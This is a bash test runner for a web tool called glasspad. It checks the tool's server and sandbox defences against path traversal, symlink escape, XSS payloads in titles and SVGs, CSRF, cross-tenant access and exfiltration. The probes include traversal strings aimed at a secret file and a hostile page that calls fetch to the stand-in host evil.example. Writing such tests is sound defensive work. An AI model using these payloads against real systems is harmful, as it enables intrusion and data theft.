#!/bin/bash
# test-security.sh — Wave 1 adversarial browser suite runner (the security gate).
#
# Builds glasspad, boots it on a loopback test port, drives a real headless
# Chromium (Playwright) through the exfil / sandbox-escape / direct-open /
# postMessage-abuse / Vega-eval probes, and tears everything down.
#
# Usage:  ./test-security.sh            # run the full suite
#         HEADED=1 ./test-security.sh   # watch it in a headed browser
#
# Re-runnable and self-contained: it installs the Playwright browser on first
# run. Requires node (>=18) and cargo. Exit 0 = the security contract holds.
set -euo pipefail
cd "$(dirname "$0")"

PORT="${GLASSPAD_TEST_PORT:-3210}"
SUITE_DIR="tests/security"

# Isolate the loopback-server pid file so this suite's `serve` invocations never
# touch the developer's real ~/.glasspad/server.pid (which a running local deploy
# may own). Each `serve` here writes/reclaims this hermetic path instead; the
# existing EXIT-trap cleanup() removes it (the later traps all chain through it).
export GLASSPAD_PID_FILE="$(mktemp -u "${TMPDIR:-/tmp}/glasspad-sec-pid.XXXXXX")"

# Isolate the return-channel submission store to a hermetic temp dir so this suite's
# `serve` invocations never write to the developer's real ~/.glasspad/submissions.
export GLASSPAD_STATE_DIR="$(mktemp -d "${TMPDIR:-/tmp}/glasspad-sec-state.XXXXXX")"

echo "==> Building glasspad"
cargo build 2>&1 | tail -1

echo "==> Bootstrapping Playwright (first run downloads Chromium)"
if [ ! -d "$SUITE_DIR/node_modules/playwright" ]; then
  ( cd "$SUITE_DIR" && npm install --silent )
fi
# Ensure the Chromium binary is present (idempotent, cached under ~/.cache).
( cd "$SUITE_DIR" && npx --yes playwright install chromium >/dev/null 2>&1 || true )

echo "==> Starting glasspad on 127.0.0.1:$PORT"
pkill -f "target/debug/glasspad serve" 2>/dev/null || true
sleep 0.5
./target/debug/glasspad serve --port "$PORT" >/tmp/glasspad-sec-test.log 2>&1 &
SERVER_PID=$!
cleanup() { kill "$SERVER_PID" 2>/dev/null || true; rm -f "$GLASSPAD_PID_FILE" 2>/dev/null || true; rm -rf "$GLASSPAD_STATE_DIR" 2>/dev/null || true; }
trap cleanup EXIT

# Wait for the server to answer.
for i in $(seq 1 40); do
  if curl -fsS "http://127.0.0.1:$PORT/demo/_c/index" >/dev/null 2>&1; then break; fi
  sleep 0.25
done

echo "==> Running adversarial browser suite"
GLASSPAD_PORT="$PORT" node "$SUITE_DIR/run.mjs"

# ---------------------------------------------------------------------------
# Wave 2a — space-model server-side probes. Path traversal and symlink escape
# are enforced by the SERVER (a browser can't help), so these are HTTP/exit-code
# checks against a live directory rather than browser assertions. They extend the
# adversarial suite with the new attack surface (asset routing + directory scan).
# ---------------------------------------------------------------------------
echo "==> Running Wave 2a space-model probes (traversal / symlink / hostile asset)"
SPACE_FAILURES=0
scheck() { # name  condition(0=pass)
  if [ "$1" = "0" ]; then echo "PASS  $2"; else echo "FAIL  $2"; SPACE_FAILURES=$((SPACE_FAILURES+1)); fi
}

WORK="$(mktemp -d)"
SPACE_PORT=$((PORT+1))
cleanup_space() { kill "${SPACE_PID:-0}" 2>/dev/null || true; rm -rf "$WORK"; }
trap 'cleanup; cleanup_space' EXIT

# A clean, servable space. `secret` lives OUTSIDE it — the symlink probe targets it.
printf 'SECRET-OUTSIDE-THE-SPACE' > "$WORK/secret.txt"
mkdir -p "$WORK/myspace/assets/sub"
printf '<!doctype html><title>Home</title><h1>hi</h1>' > "$WORK/myspace/index.html"
printf '<!doctype html><title>Sales Q3</title><h1>sales</h1>' > "$WORK/myspace/sales.html"
# Wave 4 nav-injection probe (server side): a hostile artifact TITLE that the
# resolver DECODES to raw markup as text. The trusted parent nav must never emit
# it as executable markup — it lives in the nav data literal JSON-for-script
# encoded, and is inserted client-side via textContent.
printf '<!doctype html><title>&quot;&gt;&lt;img src=x onerror=alert(1)&gt;&lt;script&gt;alert(2)&lt;/script&gt;</title><h1>inj</h1>' > "$WORK/myspace/inject.html"
printf 'console.log(1)' > "$WORK/myspace/assets/app.js"
# A hostile SVG asset: must be neutralized (served with `Content-Security-Policy: sandbox`).
printf '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' > "$WORK/myspace/assets/logo.svg"
printf '{"x":1}' > "$WORK/myspace/assets/sub/data.json"

pkill -f "target/debug/glasspad serve" 2>/dev/null || true
sleep 0.5
./target/debug/glasspad serve --port "$SPACE_PORT" "$WORK/myspace" >/tmp/glasspad-space-test.log 2>&1 &
SPACE_PID=$!
for _ in $(seq 1 40); do
  if curl -fsS "http://127.0.0.1:$SPACE_PORT/myspace/_c/index" >/dev/null 2>&1; then break; fi
  sleep 0.25
done
SB="http://127.0.0.1:$SPACE_PORT"

code() { curl -s -o /dev/null -w "%{http_code}" "$1"; }
hdr()  { curl -s -D- -o /dev/null "$1" | tr -d '\r' | awk -F': ' "tolower(\$1)==\"$2\"{print \$2}"; }

# Real content + assets serve.
[ "$(code "$SB/myspace/_c/index")" = "200" ]; scheck $? "live artifact served (200)"
[ "$(code "$SB/myspace/assets/app.js")" = "200" ]; scheck $? "real asset served (200)"
[ "$(code "$SB/myspace/assets/sub/data.json")" = "200" ]; scheck $? "nested asset served (200)"

# Asset hardening: nosniff + a `sandbox` CSP so a hostile top-level SVG/HTML asset
# runs script-less in a null origin.
[ "$(hdr "$SB/myspace/assets/logo.svg" x-content-type-options)" = "nosniff" ]; scheck $? "asset carries nosniff"
[ "$(hdr "$SB/myspace/assets/logo.svg" content-security-policy)" = "sandbox" ]; scheck $? "hostile SVG asset is sandboxed (top-level neutralized)"
[ "$(hdr "$SB/myspace/assets/app.js" content-type)" = "text/javascript; charset=utf-8" ]; scheck $? "asset MIME detected"
# No wildcard CORS on user assets: a foreign web page the user has open must not
# be able to `fetch()` and read a space's assets cross-origin.
[ -z "$(hdr "$SB/myspace/assets/data.json" access-control-allow-origin)" ]; scheck $? "asset has NO Access-Control-Allow-Origin (no cross-origin read)"

# Path-traversal probes — every one must 404 (never resolve outside the space).
for p in \
  "assets/../../secret.txt" \
  "assets/..%2f..%2fsecret.txt" \
  "assets/%2e%2e/%2e%2e/secret.txt" \
  "assets/....//secret.txt" \
  "assets/sub/../../../secret.txt" ; do
  c="$(code "$SB/myspace/$p")"
  [ "$c" = "404" ] || [ "$c" = "400" ]; scheck $? "traversal blocked: $p (got $c)"
done
# The secret is never reachable by any name.
! curl -s "$SB/myspace/assets/../../secret.txt" | grep -q SECRET-OUTSIDE; scheck $? "secret file never served via traversal"

# Wave 4 nav chrome: the trusted shell lists the space's artifacts, and an
# artifact-derived title can NEVER become live markup in the parent.
SHELL_HTML="$(curl -s "$SB/myspace/inject")"
echo "$SHELL_HTML" | grep -q 'id="gp-nav"'; scheck $? "shell renders the nav chrome container"
echo "$SHELL_HTML" | grep -q '"slug":"sales"'; scheck $? "nav table lists the space's sibling artifacts"
# The hostile title must NOT appear as raw executable markup anywhere in the shell.
! echo "$SHELL_HTML" | grep -qi '<img src=x onerror'; scheck $? "hostile title is not emitted as raw <img onerror> markup"
! echo "$SHELL_HTML" | grep -qi '<script>alert(2)'; scheck $? "hostile title is not emitted as a raw <script> element"
# It IS present, but JSON-for-script encoded (<…) in the nav data literal.
echo "$SHELL_HTML" | grep -q '\\u003cimg src=x onerror'; scheck $? "hostile title survives only as \\u003c-encoded text in the nav data"
# The trusted shell enforces Trusted Types (any accidental innerHTML sink throws).
echo "$(hdr "$SB/myspace/inject" content-security-policy)" | grep -q "require-trusted-types-for 'script'"; scheck $? "shell CSP enforces Trusted Types"

# Egress boundary held: the artifact CSP keeps `connect-src 'none'` — live reload
# is shell-side (its own connect-src 'self'), so the artifact stays fully closed.
CSP="$(hdr "$SB/myspace/_c/index" content-security-policy)"
echo "$CSP" | grep -q "connect-src 'none';"; scheck $? "artifact connect-src stays 'none' (fully closed)"
! echo "$CSP" | grep -q "/_gp/reload"; scheck $? "SSE path is not named in the artifact CSP"

# ---------------------------------------------------------------------------
# Return channel (the airlock). The trusted shell POSTs a submission; the ARTIFACT
# never gains egress. These are server-side HTTP checks (a browser can't help with
# CSRF/rate/spoof at the network layer); the browser drives the full artifact→shell
# →server chain in run.mjs above.
# ---------------------------------------------------------------------------
LB_ORIGIN="http://127.0.0.1:$SPACE_PORT"
sub_post() { # origin  body  -> http_code
  curl -s -o /dev/null -w '%{http_code}' -X POST "$SB/myspace/_gp/submit" \
    -H "Origin: $1" -H 'content-type: application/json' -d "$2"
}

# AIRLOCK REGRESSION (MUST hold): the artifact CSP is still `connect-src 'none'`
# AND the sandbox grants NO `allow-forms` — the return channel opened no egress.
! echo "$CSP" | grep -q "allow-forms"; scheck $? "airlock: artifact sandbox still has NO allow-forms"
echo "$CSP" | grep -q "sandbox allow-scripts allow-top-navigation-by-user-activation"; scheck $? "airlock: artifact sandbox tokens unchanged (no new grant)"

# Same-origin submit is accepted; a cross-origin (CSRF) submit is rejected.
[ "$(sub_post "$LB_ORIGIN" '{"data":{"a":1},"slug":"index"}')" = "201" ]; scheck $? "return: same-origin submit accepted (201)"
[ "$(sub_post "http://evil.example" '{"data":{}}')" = "403" ]; scheck $? "return: cross-origin submit rejected (CSRF 403)"

# Content-version / cross-round mismatch is rejected (409).
[ "$(sub_post "$LB_ORIGIN" '{"data":{},"content_version":"00000000deadbeef","slug":"index"}')" = "409" ]; scheck $? "return: stale content-version rejected (409)"

# Cross-space spoof: a submission is bound to the URL-path space (myspace), never a
# payload field. A submit to myspace lands under myspace; an unrelated space is empty.
sub_post "$LB_ORIGIN" '{"data":{"tag":"bound"},"slug":"sales"}' >/dev/null
curl -s "$SB/myspace/_gp/submissions" | grep -q '"key":"myspace"'; scheck $? "return: submission keyed by the URL-path space, not a payload field"
curl -s "$SB/otherspace/_gp/submissions" | grep -q '"submissions":\[\]'; scheck $? "return: an unrelated space has no submissions (no cross-space leak)"

# A2 SSE (loopback parity): the server-push stream delivers a space's submissions as
# `submission` events keyed to the URL-path space; an unrelated space's stream is
# empty (the same no-cross-space-leak boundary as the poll). `--max-time` bounds each
# held stream; curl's timeout exit is swallowed (`|| true`).
curl -s --max-time 2 "$SB/myspace/_gp/submissions/stream?since=0" > "$WORK/sse_lb.txt" 2>/dev/null || true
grep -q "event: *submission" "$WORK/sse_lb.txt"; scheck $? "return/sse: loopback stream delivers the space's submissions"
grep -q '"key":"myspace"' "$WORK/sse_lb.txt"; scheck $? "return/sse: streamed submission is keyed by the URL-path space"
curl -s --max-time 2 "$SB/otherspace/_gp/submissions/stream?since=0" > "$WORK/sse_lb_other.txt" 2>/dev/null || true
! grep -q "event: *submission" "$WORK/sse_lb_other.txt"; scheck $? "return/sse: an unrelated space's stream is empty (no cross-space leak)"

# Flood / rate limit: a burst of submits eventually 429s (per-space rate cap).
RL=0
for i in $(seq 1 40); do
  [ "$(sub_post "$LB_ORIGIN" '{"data":{"i":'"$i"'}}')" = "429" ] && RL=1 && break
done
[ "$RL" = "1" ]; scheck $? "return: a submit flood is rate-limited (429)"

kill "$SPACE_PID" 2>/dev/null || true
sleep 0.3

# ---------------------------------------------------------------------------
# B2 multi-round (return-channel round push). The authoring agent re-renders a
# LIVE hosted page (`POST /api/v1/pages/<slug>/rounds`) and the connected shell
# swaps the content in place — reusing the reload SSE carrier. The gate here:
# each pushed round MUST stay inside the frozen null-origin sandbox (no new egress,
# no `allow-forms`), a submission for a STALE round is rejected, and only the
# owning tenant may push a round. These are hosted-server HTTP checks.
# ---------------------------------------------------------------------------
echo "==> Running B2 multi-round (hosted round-push) probes"
HOST_PORT=$((PORT+2))
HOST_ORIGIN="http://127.0.0.1:$HOST_PORT"
KEYA="0123456789abcdef0123456789abcdef"
KEYB="fedcba9876543210fedcba9876543210"
KEYFILE="$WORK/keys.txt"
printf 'acme:%s\nglobex:%s\n' "$KEYA" "$KEYB" > "$KEYFILE"
mkdir -p "$WORK/hoststore"
pkill -f "target/debug/glasspad host-serve" 2>/dev/null || true
sleep 0.3
./target/debug/glasspad host-serve --bind "127.0.0.1:$HOST_PORT" \
  --public-host "$HOST_ORIGIN" --api-key-file "$KEYFILE" --store "$WORK/hoststore" \
  >/tmp/glasspad-host-test.log 2>&1 &
HOST_PID=$!
cleanup_host() { kill "${HOST_PID:-0}" 2>/dev/null || true; }
trap 'cleanup; cleanup_space; cleanup_host' EXIT
for _ in $(seq 1 40); do
  if curl -fsS "$HOST_ORIGIN/healthz" >/dev/null 2>&1; then break; fi
  sleep 0.25
done

# acme publishes a fragment page (round 0).
PUB="$(curl -s -X POST "$HOST_ORIGIN/api/v1/pages" -H "Authorization: Bearer $KEYA" \
  -H 'content-type: application/json' -d '{"html":"<h1>round zero</h1>"}')"
HSLUG="$(printf '%s' "$PUB" | sed -n 's/.*"slug":"\([a-z0-9]*\)".*/\1/p')"
[ -n "$HSLUG" ]; scheck $? "b2: published a hosted page for the round exchange"

# The round-0 content route is frozen-sandboxed (baseline, pre-push).
HCSP0="$(hdr "$HOST_ORIGIN/p/$HSLUG/_c/index" content-security-policy)"
echo "$HCSP0" | grep -q "connect-src 'none';"; scheck $? "b2: round 0 keeps connect-src 'none'"
# Its content-version is what a stale round-0 submission will echo.
CV0="$(curl -s "$HOST_ORIGIN/p/$HSLUG/_c/index" | sed -n 's/.*name="gp-content-version" content="\([0-9a-f]*\)".*/\1/p')"
[ -n "$CV0" ]; scheck $? "b2: round 0 inlines its content-version for the bridge"

# acme pushes round 1 (a re-render in response). 200 with a new round + version.
RND="$(curl -s -X POST "$HOST_ORIGIN/api/v1/pages/$HSLUG/rounds" -H "Authorization: Bearer $KEYA" \
  -H 'content-type: application/json' -d '{"html":"<h1>round one</h1>"}')"
echo "$RND" | grep -q '"round":1'; scheck $? "b2: owner push advances to round 1 (200)"
CV1="$(printf '%s' "$RND" | sed -n 's/.*"content_version":"\([0-9a-f]*\)".*/\1/p')"

# The NEW round is served AND still frozen-sandboxed — pushing a round widens nothing.
HROUND1="$(curl -s "$HOST_ORIGIN/p/$HSLUG/_c/index")"
echo "$HROUND1" | grep -q "round one"; scheck $? "b2: the new round body is now served"
HCSP1="$(hdr "$HOST_ORIGIN/p/$HSLUG/_c/index" content-security-policy)"
echo "$HCSP1" | grep -q "connect-src 'none';"; scheck $? "b2: round 1 STILL keeps connect-src 'none' (no new egress)"
! echo "$HCSP1" | grep -q "allow-forms"; scheck $? "b2: round 1 sandbox still has NO allow-forms (airlock held)"
echo "$HCSP1" | grep -q "sandbox allow-scripts allow-top-navigation-by-user-activation"; scheck $? "b2: round 1 sandbox tokens unchanged (no new grant)"

# Cross-round binding: a submission answering the STALE round 0 is rejected (409);
# the CURRENT round 1 is accepted (201).
hsub() { # content_version -> http_code
  curl -s -o /dev/null -w '%{http_code}' -X POST "$HOST_ORIGIN/api/v1/pages/$HSLUG/submit" \
    -H "Origin: $HOST_ORIGIN" -H 'content-type: application/json' \
    -d '{"data":{"a":1},"content_version":"'"$1"'"}'
}
[ "$(hsub "$CV0")" = "409" ]; scheck $? "b2: a submission for the STALE round is rejected (409)"
[ "$(hsub "$CV1")" = "201" ]; scheck $? "b2: a submission for the CURRENT round is accepted (201)"

# Owner-scope: a DIFFERENT tenant cannot push a round to acme's page (opaque 404),
# and the victim's served body is unchanged.
RB="$(curl -s -o /dev/null -w '%{http_code}' -X POST "$HOST_ORIGIN/api/v1/pages/$HSLUG/rounds" \
  -H "Authorization: Bearer $KEYB" -H 'content-type: application/json' -d '{"html":"<h1>hijacked</h1>"}')"
[ "$RB" = "404" ]; scheck $? "b2: a non-owner round push is rejected (404)"
curl -s "$HOST_ORIGIN/p/$HSLUG/_c/index" | grep -q "round one"; scheck $? "b2: a rejected push left the served body unchanged"
# An unauthenticated push is rejected (401).
RN="$(curl -s -o /dev/null -w '%{http_code}' -X POST "$HOST_ORIGIN/api/v1/pages/$HSLUG/rounds" \
  -H 'content-type: application/json' -d '{"html":"<h1>x</h1>"}')"
[ "$RN" = "401" ]; scheck $? "b2: an unauthenticated round push is rejected (401)"

# SSE isolation (the round push reuses the reload carrier): round events are scoped
# SERVER-SIDE by `?space=`. A client that does NOT name this page's slug must NEVER
# receive its round event — otherwise any connected viewer could harvest other
# tenants' capability slugs from the global stream. Prove both directions.
# (a) No filter → the slug must NOT appear in the stream even as a round is pushed.
( curl -s --max-time 2 "$HOST_ORIGIN/_gp/reload" > "$WORK/sse_nofilter.txt" 2>/dev/null & )
sleep 0.4
curl -s -X POST "$HOST_ORIGIN/api/v1/pages/$HSLUG/rounds" -H "Authorization: Bearer $KEYA" \
  -H 'content-type: application/json' -d '{"html":"<h1>leak probe</h1>"}' >/dev/null
sleep 2
! grep -q "$HSLUG" "$WORK/sse_nofilter.txt"; scheck $? "b2/SSE: an unscoped reload stream never leaks another page's slug"
# (b) Correct scope → the round event IS delivered to a client that named the slug.
( curl -s --max-time 2 "$HOST_ORIGIN/_gp/reload?space=$HSLUG" > "$WORK/sse_scoped.txt" 2>/dev/null & )
sleep 0.4
curl -s -X POST "$HOST_ORIGIN/api/v1/pages/$HSLUG/rounds" -H "Authorization: Bearer $KEYA" \
  -H 'content-type: application/json' -d '{"html":"<h1>scoped delivery</h1>"}' >/dev/null
sleep 2
grep -q "event: *round" "$WORK/sse_scoped.txt"; scheck $? "b2/SSE: a slug-scoped stream DOES receive its own round event"

# ---------------------------------------------------------------------------
# A2 SSE transport (return-channel submission streaming). The AGENT consumes
# submissions as a server-push stream (GET /api/v1/pages/<slug>/submissions/stream).
# The gate: the stream carries the SAME API-key + per-tenant scope as the poll/wait
# reads (a cross-tenant stream is an opaque 404, an unauthenticated one 401 — decided
# BEFORE any submission byte is streamed), it honors the since=<id> cursor (no
# re-deliver), a submission landing during the hold is pushed live, and adding it
# widened NOTHING in the artifact sandbox (the artifact CSP still names no stream path
# and stays connect-src 'none', so a sandboxed artifact can never reach it).
# ---------------------------------------------------------------------------
echo "==> Running A2 SSE streaming (return-channel stream) probes"
SSTREAM="$HOST_ORIGIN/api/v1/pages/$HSLUG/submissions/stream"

# (auth) An unauthenticated stream is rejected (401) before any streaming begins.
[ "$(curl -s -o /dev/null -w '%{http_code}' "$SSTREAM")" = "401" ]; scheck $? "sse: an unauthenticated stream is rejected (401)"
# (isolation) A DIFFERENT tenant streaming acme's page is an opaque 404 (no bytes).
[ "$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $KEYB" "$SSTREAM")" = "404" ]; scheck $? "sse: a cross-tenant stream is refused (opaque 404)"

# (delivery) The owner streams from since=0 and receives the page's stored submission
# (created earlier by the round-1 submit) as a `submission` SSE event.
curl -s --max-time 3 -H "Authorization: Bearer $KEYA" "$SSTREAM?since=0" > "$WORK/sse_owner.txt" 2>/dev/null || true
grep -q "event: *submission" "$WORK/sse_owner.txt"; scheck $? "sse: the owner stream delivers a submission event"
LASTID="$(grep '^id:' "$WORK/sse_owner.txt" | tail -1 | sed 's/^id: *//')"
[ -n "$LASTID" ]; scheck $? "sse: the stream stamps a per-submission id cursor"

# (cursor integrity) Streaming from a cursor AT the last id re-delivers nothing — no
# already-seen submission is repeated (no skip/dup across a reconnect).
curl -s --max-time 3 -H "Authorization: Bearer $KEYA" "$SSTREAM?since=$LASTID" > "$WORK/sse_cursor.txt" 2>/dev/null || true
! grep -q "event: *submission" "$WORK/sse_cursor.txt"; scheck $? "sse: a cursor at the last id re-delivers nothing"

# (live push) A submission landing DURING the hold is pushed. Hold the stream from the
# cursor as a real background job (a `( … & )` subshell loses curl's stdout buffer when
# --max-time kills it; a plain `&` + `wait` flushes it), submit, then confirm the new
# payload arrived on the held stream.
curl -s --max-time 4 -H "Authorization: Bearer $KEYA" "$SSTREAM?since=$LASTID" > "$WORK/sse_live.txt" 2>/dev/null &
SSE_LIVE_PID=$!
sleep 0.5
CVNOW="$(curl -s "$HOST_ORIGIN/p/$HSLUG/_c/index" | sed -n 's/.*name="gp-content-version" content="\([0-9a-f]*\)".*/\1/p')"
curl -s -o /dev/null -X POST "$HOST_ORIGIN/api/v1/pages/$HSLUG/submit" \
  -H "Origin: $HOST_ORIGIN" -H 'content-type: application/json' \
  -d '{"data":{"live":"sse"},"content_version":"'"$CVNOW"'"}'
wait "$SSE_LIVE_PID" || true
grep -q '"live":"sse"' "$WORK/sse_live.txt"; scheck $? "sse: a submission landing during the hold is pushed live"

# (sandbox unwidened) The artifact CSP still names no stream path and stays closed —
# a sandboxed artifact (connect-src 'none', no allow-forms) can never reach the stream.
! echo "$HCSP1" | grep -q "submissions/stream"; scheck $? "sse: the artifact CSP never names the stream path (artifact cannot reach it)"

# ---------------------------------------------------------------------------
# Gap 1 — multi-page hosted publish (space ingest). A whole SPACE (a directory of
# linked .html artifacts) is published into ONE hosted namespace /p/<slug>/… . The
# gate here: every page of the space stays a null-origin sandboxed iframe under the
# FROZEN artifact CSP (a hostile page in the bundle cannot widen it), in-space nav
# addresses only sibling pages of the SAME space slug, and cross-space / cross-tenant
# isolation holds (a page slug is never a top-level space; another tenant cannot
# update-in-place a space it does not own). Reuses the running host server (acme/globex).
# ---------------------------------------------------------------------------
echo "==> Running Gap 1 space-ingest probes"
# A bundle: two fragment pages that relative-link to each other, plus a HOSTILE page
# whose body tries to widen the CSP via <meta>, plus a small asset (base64).
LOGO_B64="$(printf '<svg xmlns="http://www.w3.org/2000/svg"></svg>' | base64 | tr -d '\n')"
cat > "$WORK/space.json" <<JSON
{ "pages": [
    { "slug": "index", "html": "<title>Home</title><h1>Home</h1><a href=\"./guide\">guide</a>" },
    { "slug": "guide", "html": "<h1>Guide</h1><a href=\"./index\">home</a><img src=\"./assets/logo.svg\">" },
    { "slug": "evil", "html": "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src *; connect-src *\"><script>fetch('http://evil.example/x')</script><h1>x</h1>" }
  ],
  "assets": [ { "path": "logo.svg", "content_base64": "$LOGO_B64" } ],
  "nav": ["index","guide","evil"], "title": "Docs", "space_key": "docsite" }
JSON
SPUB="$(curl -s -X POST "$HOST_ORIGIN/api/v1/spaces" -H "Authorization: Bearer $KEYA" \
  -H 'content-type: application/json' -d @"$WORK/space.json")"
SPSLUG="$(printf '%s' "$SPUB" | sed -n 's/.*"slug":"\([a-z0-9]*\)".*/\1/p')"
[ -n "$SPSLUG" ]; scheck $? "space: a multi-page space is published under one namespace"
printf '%s' "$SPUB" | grep -q '"page_count":3'; scheck $? "space: the ingest envelope reports all pages"

# Every page serves under the FROZEN artifact CSP — the hostile page cannot widen it.
for PG in index guide evil; do
  PGCSP="$(hdr "$HOST_ORIGIN/p/$SPSLUG/_c/$PG" content-security-policy)"
  echo "$PGCSP" | grep -q "connect-src 'none';"; scheck $? "space: page '$PG' keeps connect-src 'none' (egress closed)"
  ! echo "$PGCSP" | grep -q "allow-forms"; scheck $? "space: page '$PG' sandbox has NO allow-forms (airlock held)"
done
EVILCSP="$(hdr "$HOST_ORIGIN/p/$SPSLUG/_c/evil" content-security-policy)"
echo "$EVILCSP" | grep -q "sandbox allow-scripts"; scheck $? "space: a hostile bundle page stays sandboxed (server CSP authoritative)"
! echo "$EVILCSP" | grep -q "default-src \*"; scheck $? "space: a hostile page's <meta> cannot widen the response CSP"

# In-space relative links resolve to SIBLING pages of the same space (served body
# keeps the relative href; the bridge/nav only knows this space's slugs).
curl -s "$HOST_ORIGIN/p/$SPSLUG/_c/index" | grep -q 'href="./guide"'; scheck $? "space: an in-space relative link is preserved for same-space nav"
# The asset serves under the space namespace with its detected MIME.
[ "$(hdr "$HOST_ORIGIN/p/$SPSLUG/assets/logo.svg" content-type)" = "image/svg+xml" ]; scheck $? "space: a space asset serves under /p/<space>/assets with correct MIME"

# CROSS-SPACE ISOLATION: a page slug is reachable ONLY under its own space, never as
# a top-level space of its own; a bogus space slug is an opaque 404.
[ "$(curl -s -o /dev/null -w '%{http_code}' "$HOST_ORIGIN/p/guide/_c/index")" = "404" ]; scheck $? "space: a page slug is NOT addressable as a top-level space (no cross-space escape)"
[ "$(curl -s -o /dev/null -w '%{http_code}' "$HOST_ORIGIN/p/zzzzzzzzzzzzzzzzzzzzzzzzzz/_c/index")" = "404" ]; scheck $? "space: an unknown space slug is an opaque 404"

# STABLE KEY updates in place (same slug, 200) — a re-publish reflects new content.
cat > "$WORK/space2.json" <<JSON
{ "pages": [ { "slug": "index", "html": "<title>Home</title><h1>Home v2</h1>" } ], "space_key": "docsite" }
JSON
SPUB2="$(curl -s -w '\n%{http_code}' -X POST "$HOST_ORIGIN/api/v1/spaces" -H "Authorization: Bearer $KEYA" \
  -H 'content-type: application/json' -d @"$WORK/space2.json")"
echo "$SPUB2" | tail -1 | grep -q '200'; scheck $? "space: a re-publish with the same --space-key returns 200 (update in place)"
SPSLUG2="$(printf '%s' "$SPUB2" | sed -n 's/.*"slug":"\([a-z0-9]*\)".*/\1/p')"
[ "$SPSLUG2" = "$SPSLUG" ]; scheck $? "space: the in-place update kept the same slug/URL"
curl -s "$HOST_ORIGIN/p/$SPSLUG/_c/index" | grep -q "Home v2"; scheck $? "space: the in-place update swapped the served content"

# CROSS-TENANT: globex using the SAME stable key gets its OWN space (a tenant can
# never update-in-place another tenant's space).
cat > "$WORK/space_b.json" <<JSON
{ "pages": [ { "slug": "index", "html": "<h1>globex</h1>" } ], "space_key": "docsite" }
JSON
GPUB="$(curl -s -X POST "$HOST_ORIGIN/api/v1/spaces" -H "Authorization: Bearer $KEYB" \
  -H 'content-type: application/json' -d @"$WORK/space_b.json")"
GSLUG="$(printf '%s' "$GPUB" | sed -n 's/.*"slug":"\([a-z0-9]*\)".*/\1/p')"
[ -n "$GSLUG" ] && [ "$GSLUG" != "$SPSLUG" ]; scheck $? "space: the same key under a different tenant yields a DISTINCT space (per-tenant scope)"
# acme's space is unchanged by globex's publish.
curl -s "$HOST_ORIGIN/p/$SPSLUG/_c/index" | grep -q "Home v2"; scheck $? "space: a cross-tenant publish left the owner's space untouched"

# Space ingest requires auth (fail-closed), same as single-page ingest.
[ "$(curl -s -o /dev/null -w '%{http_code}' -X POST "$HOST_ORIGIN/api/v1/spaces" -H 'content-type: application/json' -d '{"pages":[{"slug":"index","html":"x"}]}')" = "401" ]; scheck $? "space: an unauthenticated space publish is rejected (401)"

kill "$HOST_PID" 2>/dev/null || true
sleep 0.3

# Symlink escape: a space containing a symlinked artifact is a hard scan error —
# `serve` must refuse to start (non-zero) and name the symlink, so a crafted link
# can never expose a file outside the space.
mkdir -p "$WORK/linkspace"
ln -s "$WORK/secret.txt" "$WORK/linkspace/index.html"
if ./target/debug/glasspad serve --port "$SPACE_PORT" "$WORK/linkspace" >/tmp/glasspad-link-test.log 2>&1; then
  scheck 1 "symlinked artifact refused at startup"
else
  grep -qi "symlink" /tmp/glasspad-link-test.log; scheck $? "symlinked artifact refused with informative error"
fi

# Reserved-name / collision: hard errors, refuse to start.
mkdir -p "$WORK/reserved"; printf x > "$WORK/reserved/api.html"; printf x > "$WORK/reserved/index.html"
if ./target/debug/glasspad serve --port "$SPACE_PORT" "$WORK/reserved" >/tmp/glasspad-reserved-test.log 2>&1; then
  scheck 1 "reserved slug refused at startup"
else
  grep -qi "reserved" /tmp/glasspad-reserved-test.log; scheck $? "reserved slug refused with informative error"
fi

echo ""
if [ "$SPACE_FAILURES" -eq 0 ]; then
  echo "✅ Wave 2a space-model probes PASSED"
else
  echo "❌ $SPACE_FAILURES Wave 2a space-model probe(s) FAILED"
  exit 1
fi
